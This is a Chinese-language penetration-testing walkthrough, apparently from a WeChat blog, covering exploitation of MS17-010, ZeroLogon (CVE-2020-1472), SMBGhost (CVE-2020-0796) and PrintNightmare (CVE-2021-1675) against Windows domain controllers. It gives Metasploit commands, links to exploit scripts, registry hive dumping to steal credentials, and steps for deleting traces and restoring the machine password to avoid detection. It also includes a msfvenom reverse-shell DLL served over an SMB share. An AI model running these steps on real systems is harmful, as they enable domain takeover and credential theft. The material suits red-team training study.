> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dva3WraXlXkqkVZHCakkUA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhYIhQt2h8RcZ7aAWkx3kORT4V3wjygzwaHXmh3y4LqxwVXlwuuNibzEg/640?wx_fmt=jpeg)

**概览**  

MS17010、CVE-2020-1472、CVE-2020-0796、CVE-2021-1675。

**MS17010**

```
use exploit/windows/smb/ms17_010_eternalblue
set rhosts x.x.x.x
run

```

**CVE-2020-1472**

```
WindowsServer2008R2forx64-basedSystemsServicePack1
WindowsServer2008R2forx64-basedSystemsServicePack1(ServerCoreinstallation)
WindowsServer2012
WindowsServer2012(ServerCoreinstallation)
WindowsServer2012R2
WindowsServer2012R2(ServerCoreinstallation)
WindowsServer2016
WindowsServer2016(ServerCoreinstallation)
WindowsServer2019
WindowsServer2019(ServerCoreinstallation)
WindowsServer,version1903(ServerCoreinstallation)
WindowsServer,version1909(ServerCoreinstallation)
WindowsServer,version2004(ServerCoreinstallation)

```

探测脚本：

```
https://github.com/SecuraBV/CVE-2020-1472

```

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhKZ6YOuEzKuCXpKHbfqGlpqZoLExOMvBbjUibhxoprnTwJEWMdM7y7EQ/640?wx_fmt=png)

利用脚本：

```
https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py

```

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhw7VXdaIm1Pm6icicMpMVytq8RicIBsuY2ficjvG1osQlFTOibj7PAdSFTUA/640?wx_fmt=png)

随后利用 impacket 中的 secretsdump 脚本来获取域中保存的 hash

域控名：afa.com

DC 的 NetBios 名：DC-AFA

查看 NetBios 名命令：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhLXLLuyExRvl0xxlBWa26C7rump7XSbSs1JUibmrSqfBdlfDzRnlo27g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhzCANWpE6RdkAEI93rTBWLwCuzB6f9AhEbQibWDswhL3l7gDyVNgzv7Q/640?wx_fmt=png)

根据结果，基本 administrator500 的那个就是域管了，有了 hash，就可以结合 wmiexec 来获取一个 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhZu5CyjYpUMfwz1YMiajk1tfsKFrlCk7GMV5UgUEyEn4vNWKF3E9TdHQ/640?wx_fmt=png)

随后需要获取目标机的 sam 然后解密一下 hash，之所以要这个步骤，是因为前面漏洞利用的时候，我们把域控密码置为空了，如果不改回去，后续可能会影响域相关功能，且也容易被发现。

改回去则需要一串 MACHINE.ACC 的值，该值可从 sam 中获取，步骤如下，首先从注册表保存下相关的 save：

```
reg save HKLM\sam sam.save
reg save HKLM\SYSTEM SYSTEM.save
reg save HKLM\SECURITY SECURITY.save

```

然后使用 get 命令将这三个 save 文件下载回来，注意，不通版本的 wmiexec 的下载命令有区别，最好 help 查看一下：

```
get sam.save
get SYSTEM.save
get SECURITY.save

```

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhLYmYUACEC3M1AyaFuM9jflicLBweiaggzZkhm5MHicCXFIYOp95f2VFOQ/640?wx_fmt=png)

下载后记得把目标服务器的删除：

```
del /q /f sam.save
del /q /f SYSTEM.save
del /q /f SECURITY.save

```

如果文件过大，可以考虑压缩后再下载，windows 本身的 makecab 支持进行压缩：

```
makecab /d compressiontype=lzx 1.txt 1.rar

```

其中 d 参数用来指定压缩类型，而 lzx 是一种高质量压缩的形式，下面例子中，不带该参数压缩后大小为 400k 左右，带上后其大小为 200k 左右：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhI8zvSuXDyu3T2f2g3PvX0yBricJgJibhjibBvZuF8qKzulFvOWgKcAlJQ/640?wx_fmt=png)

下载本地后还使用 secretsdump 即可，解析一下，图中标注的那串值就是

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhgUSwFlFtgjoWw3vc3KmAHcCjG4SruicFALLOYBmRGE3iaZxj3iat5RfOg/640?wx_fmt=png)

恢复用到的脚本：

```
https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py

```

其中 afa 是域控名，DC-AFA 是 NetBios 名，DC-afa 是域控的主机名，这里的格式和上面那个利用脚本一样，主机名换成 IP 应该也可以（没测试）：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhp5KMuxCvOtKwcfLeiaA8ayv3rnAwpOibF6ib5kUlfUZQSuvZYu56fGmdQ/640?wx_fmt=png)

恢复后再重新获取 hash 就获取不到了，从新运行 restorepassword 会报错：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhbC5erkQ9e0wQLs1SGWRgbbkNCyxFNG3AHPSJjCIc3yMlaBMXJZ9mqw/640?wx_fmt=png)

**CVE-2020-0796**

CVE-2020-0796 也叫永恒之黑，是 SMBv3（3.1.1）的远程代码执行漏洞。其影响范围:

```
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server , Version1903 (ServerCoreinstallation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server , Version1909 (ServerCoreinstallation)

```

基本是侧重于 win10，而 win10 很少有做为域控的，但这里也了解一下。

利用脚本：

```
https://github.com/chompie1337/SMBGhost_RCE_PoC

```

首先先用 msfvenom 生成一个 payload，b 代表去掉坏字符，即影响 payload 的字符，在 python 中 x00 相当于个空串，i 代表 payload 的编码次数，f 指定 payload 的格式：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhms6n5wJy9catnDJNVKl0KRibiaZEibTVUDFozoyrURxp7wjsU2uuJiccjA/640?wx_fmt=png)

随后将 exploit 脚本中 USER_PAYLOAD 那段替换为上门的 payload，替换后把 buf 关键字批量替换成 USER_PAYLOAD 即可：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQh3hrF5JaibAGhSa8ExZhSCJ61JTuKhoB8G0DuFickmdrpU0cFvcIxEZdA/640?wx_fmt=png)

运行 exploit 脚本（我这系统版本对不上，失败了），如果提示 physical read failed，可以参考如下链接：

```
https://github.com/chompie1337/SMBGhost_RCE_PoC/issues/6

```

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhMr9tcbaib6T3stUUnCkd4RnxPkrDgspics6kBicHGQVC8SUfUfonWbcbA/640?wx_fmt=png)

版本符合，脚本执行成功的话，目标机会开启 4444 端口，这时再用 msf 去连接即可：

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 4444
set rhost 192.168.136.152
run

```

PS：我们利用这个漏洞前需要确认目标版本是否符合，这个可以用两种方法，一种是找相关的批量探测扫描脚本，如果符合，会提示存在漏洞，比如：

```
https://github.com/ZecOps/SMBGhost-SMBleed-scanner

```

第二个就是通过 ver 命令看下目标机的版本号，1903 对应的小版本是 18362，当然 winver 也可以看，不过会弹框出来，不适用于命令行：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhzxzrRbbuXfOibJlITCYZZjQs4Bpcq5qIHxYCIgGWx6p2wfyrRjLjFQw/640?wx_fmt=png)

**CVE-2021-1675**

CVE-2021-1675 为 Windows Print Spooler 权限提升漏洞，前提条件是需要一个普通域账户及开启 Spooler 服务，其影响版本如下列表：

```
Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows Server, version 1909 (Server Core installation)
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems

```

普通域账户有，当初建域时新建了两个，一个 jack 一个 jixi，而 Spooler 服务都是默认开启的：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhlhEswXu19biawgorUb67v4yWmTGIlO8m9Z44QeqKUmRT7tFsVKt9a7A/640?wx_fmt=png)

条件满足后，首先下载一下利用脚本：

```
git clone https://github.com/cube0x0/CVE-2021-1675.git
cd CVE-2021-1675/SharpPrintNightmare

```

进到 SharpPrintNightmare 目录后，需要下载指定的 impacker 包：

```
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```

注意：如果在 Kali 上运行该脚本的话，会和自带的 impacker 起冲突，这里我用的 ubuntu 运行的，ubuntu 需要手动安装一下 smb 服务：

```
sudo apt install samba samba-common
sudo vim /etc/samba/smb.conf 
sudo service smbd start

```

其中编辑 smb.conf 文件，直接在文件末尾添加以下内容：

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445
[smb]
comment = Samba
path = /tmp/
guestok = yes
read only = no
browsable = yes

```

[smb] 代表是 smb 共享服务的路径名叫 smb，如果你叫 smb2，那么访问共享的路径就需要带上 smb2，path 代表的是共享目录，共享文件要放这个目录。

配置好后，这里用 msf 生成一个 dll，命令如下：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.128 LPORT=4444 -f dll -o /tmp/sysa.dll

```

将该 dll 复制到 ubuntu 的 tmp 目录下，此时目标机是可以访问到的：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhBWHGPaGpM60zAA440icr532Aic2x4E63DHtclBIKrUKwQ4M5tS0wpzIg/640?wx_fmt=png)

至此就可以运行脚本了，脚本运行格式如下：

```
python3 CVE-2021-1675.py 域名/域普通用户名:用户密码@域控IP smb共享文件的路径

```

这个洞也可以打非域内的机器，非域内的话，把域名去掉就可以。

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhx0QFmzEdLsW6gvMVhqc11lZDpsaj2nqzks3ERDDvUMicF9eYhFGAacw/640?wx_fmt=png)

dll 文件会打到目标机上：

![](https://mmbiz.qpic.cn/mmbiz_png/7vWmVUOuicu33FEhFCI1gNRrvWfJAuEQhYJRbZLF1VR6WfBYjYh4rAsSsOUd3DeVAuG5T9FzSRthCWCovf9aFzA/640?wx_fmt=png)

meterpreter 监听本地相应端口即可收到 shell，我这里失败了，上不了线，先暂时这样吧，后续有机会再看看。